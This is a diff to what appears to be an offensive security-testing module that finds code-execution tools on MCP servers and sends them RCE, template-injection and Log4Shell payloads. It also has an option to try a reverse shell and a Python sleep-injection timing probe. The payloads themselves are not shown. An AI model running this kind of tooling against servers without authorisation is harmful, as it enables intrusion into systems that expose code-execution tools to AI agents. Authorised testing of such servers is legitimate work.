@@ -29,10 +29,20 @@ def execute(target, params, context):
     oob_wait = int(params.get("oob_wait_seconds", 20))
     sleep_seconds = int(params.get("sleep_seconds", 8))
     only_tool_names = params.get("only_tool_names") or []
+    languages = params.get("languages") or ["python", "node", "php", "ruby", "java"]
+    include_ssti = bool(params.get("include_ssti", True))
+    include_log4shell = bool(params.get("include_log4shell", True))
     try_reverse_shell = bool(params.get("try_reverse_shell", True))
     rs_wait = int(params.get("rs_wait_seconds", 15))
+    tool_keywords = params.get("tool_keywords") or list(_CODE_KEYWORDS)
+    protocol_version = params.get("protocol_version") or None
+    transport_override = params.get("transport_override") or None
 
-    mcp = mcp_client.MCPClient.from_target(target, timeout=timeout)
+    mcp = mcp_client.MCPClient.from_target(
+        target, timeout=timeout,
+        protocol_version=protocol_version,
+        force_transport=transport_override,
+    )
     try:
         disc = mcp.discover()
         if not disc["initialized"]:
@@ -55,14 +65,24 @@ def execute(target, params, context):
         else:
             cands = [t for t in tools
                      if any(k in f"{t.get('name','')} {t.get('description','')}".lower()
-                            for k in _CODE_KEYWORDS)]
+                            for k in tool_keywords)]
         if not cands:
             rb.warn("No obvious code-runtime tools. Try 'only_tool_names'.")
             return rb.finalize(success=True)
         rb.info(f"Candidate code-runtime tools: {[t.get('name') for t in cands]}")
 
         oob_payloads = payloads.get("rce") or []
-        oob_payloads = [p for p in oob_payloads if "oob" in (p.get("tags") or [])]
+        oob_payloads = [p for p in oob_payloads
+                         if "oob" in (p.get("tags") or [])
+                         and any(lang in (p.get("tags") or []) for lang in languages)]
+        if include_ssti:
+            oob_payloads += [p for p in (payloads.get("rce:ssti") or [])
+                              if "ssti" in (p.get("tags") or [])]
+        if include_log4shell:
+            oob_payloads += payloads.get("rce:log4shell") or \
+                            payloads.get("log4shell") or []
+        rb.info(f"RCE payload set: {len(oob_payloads)} (langs={languages}, "
+                f"ssti={include_ssti}, log4shell={include_log4shell})")
 
         timing_marker = f"__import__('time').sleep({sleep_seconds})"
         timing_variants = {
